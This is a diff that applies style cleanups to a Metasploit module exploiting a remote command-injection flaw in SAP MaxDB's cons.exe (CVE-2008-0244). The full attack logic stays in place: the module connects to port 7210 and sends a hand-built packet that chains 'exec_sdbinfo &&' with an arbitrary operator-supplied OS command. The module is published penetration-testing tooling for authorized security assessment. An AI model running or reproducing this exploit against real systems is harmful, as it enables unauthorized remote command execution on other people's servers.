@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -5,33 +6,32 @@
 
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Tcp
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'SAP MaxDB cons.exe Remote Command Injection',
-      'Description'    => %q{
-          SAP MaxDB is prone to a remote command-injection vulnerability
-          because the application fails to properly sanitize user-supplied input.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['OSVDB', '40210' ],
-          ['BID', '27206'],
-          ['CVE', '2008-0244'],
-        ],
-      'DisclosureDate' => 'Jan 9 2008'))
+                      'Name'           => 'SAP MaxDB cons.exe Remote Command Injection',
+                      'Description'    => %q(
+                          SAP MaxDB is prone to a remote command-injection vulnerability
+                          because the application fails to properly sanitize user-supplied input.
+                      ),
+                      'Author'         => [ 'MC' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          ['OSVDB', '40210' ],
+                          ['BID', '27206'],
+                          ['CVE', '2008-0244']
+                        ],
+                      'DisclosureDate' => 'Jan 9 2008'))
 
-      register_options(
-        [
-          Opt::RPORT(7210),
-          OptString.new('CMD', [ false, 'The OS command to execute', 'hostname']),
-        ], self.class)
+    register_options(
+      [
+        Opt::RPORT(7210),
+        OptString.new('CMD', [ false, 'The OS command to execute', 'hostname'])
+      ], self.class
+    )
   end
 
   def run
@@ -55,17 +55,15 @@ class MetasploitModule < Msf::Auxiliary
 
     ver = sock.get_once || ''
 
-    info = ver[27,2000]
-    if (info.length > 0)
-      print_status(info)
-    end
+    info = ver[27, 2000]
+    print_status(info) unless info.empty?
 
     # Send our command.
     len = 39 + datastore['CMD'].length
 
     data =  len.chr + "\x00\x00\x00\x03\x3F\x00\x00\x01\x00\x00\x00\x54\x0D\x00\x00"
     data << "\x00\x00\x04\x00" + len.chr + "\x00\x00\x00\x65\x78\x65\x63\x5F\x73\x64"
-    data << "\x62\x69\x6E\x66\x6F\x20\x26\x26" + "#{datastore['CMD']}"
+    data << "\x62\x69\x6E\x66\x6F\x20\x26\x26" + datastore['CMD'].to_s
 
     sock.put(data)
 
@@ -73,7 +71,5 @@ class MetasploitModule < Msf::Auxiliary
     print_line(res)
 
     disconnect
-
   end
-
 end
